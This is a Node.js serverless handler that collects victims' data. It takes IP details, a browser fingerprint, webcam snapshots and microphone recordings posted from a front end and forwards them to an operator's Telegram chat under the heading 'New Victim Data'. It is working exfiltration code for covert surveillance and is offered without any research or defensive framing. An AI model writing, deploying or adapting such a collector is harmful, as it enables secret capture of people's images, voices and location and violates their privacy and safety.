// api/collect.js
const FormData = require('form-data');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // 1. Read environment variables
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
        return res.status(500).json({ 
            error: 'Server misconfigured: missing token or chat ID',
            tokenExists: !!token,
            chatIdExists: !!chatId
        });
    }

    // 2. Parse request body
    let body;
    try {
        body = req.body;
    } catch (e) {
        console.error('❌ Failed to parse body:', e);
        return res.status(400).json({ error: 'Invalid JSON' });
    }

    const { ipData, fingerprint, webcam, mic, timestamp } = body;
    console.log(`[+] Received data at ${timestamp}`);
    console.log(`[+] IP: ${ipData?.ip || 'N/A'}`);
    console.log(`[+] Webcam: ${webcam ? 'yes (size: ' + webcam.length + ')' : 'no'}`);
    console.log(`[+] Mic: ${mic ? 'yes (size: ' + mic.length + ')' : 'no'}`);

    // Helper to send to Telegram
    async function sendToTelegram(method, payload) {
        const url = `https://api.telegram.org/bot${token}/${method}`;
        try {
            const response = await fetch(url, payload);
            const data = await response.json();
            if (!response.ok) {
                console.error(`❌ Telegram ${method} failed:`, data);
                return { success: false, error: data };
            }
            console.log(`✅ Telegram ${method} succeeded.`);
            return { success: true, data };
        } catch (e) {
            console.error(`❌ Network error in ${method}:`, e.message);
            return { success: false, error: e.message };
        }
    }

    const results = {};

    // --- 1. Send text message ---
    let message = '📡 *New Victim Data*\n\n';
    message += `*IP Info:*\n${JSON.stringify(ipData, null, 2)}\n\n`;
    message += `*Fingerprint:*\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
    message += `*Timestamp:* ${timestamp}`;

    const textResult = await sendToTelegram('sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    });
    results.text = textResult;

    // --- 2. Send webcam photo (if present) ---
    if (webcam) {
        try {
            const base64Data = webcam.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'webcam.jpg', contentType: 'image/jpeg' });

            const photoResult = await sendToTelegram('sendPhoto', {
                method: 'POST',
                body: form,
                headers: form.getHeaders()
            });
            results.photo = photoResult;
        } catch (e) {
            console.error('❌ Photo processing error:', e);
            results.photo = { success: false, error: e.message };
        }
    } else {
        results.photo = { success: false, error: 'No webcam data' };
    }

    // --- 3. Send microphone audio (if present) ---
    if (mic) {
        try {
            const base64Data = mic.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('audio', buffer, { filename: 'mic.wav', contentType: 'audio/wav' });

            const audioResult = await sendToTelegram('sendAudio', {
                method: 'POST',
                body: form,
                headers: form.getHeaders()
            });
            results.audio = audioResult;
        } catch (e) {
            console.error('❌ Audio processing error:', e);
            results.audio = { success: false, error: e.message };
        }
    } else {
        results.audio = { success: false, error: 'No mic data' };
    }

    // --- Return summary to frontend ---
    const allSuccess = results.text.success && (results.photo.success !== false) && (results.audio.success !== false);
    res.status(allSuccess ? 200 : 207).json({
        success: allSuccess,
        results: results
    });
};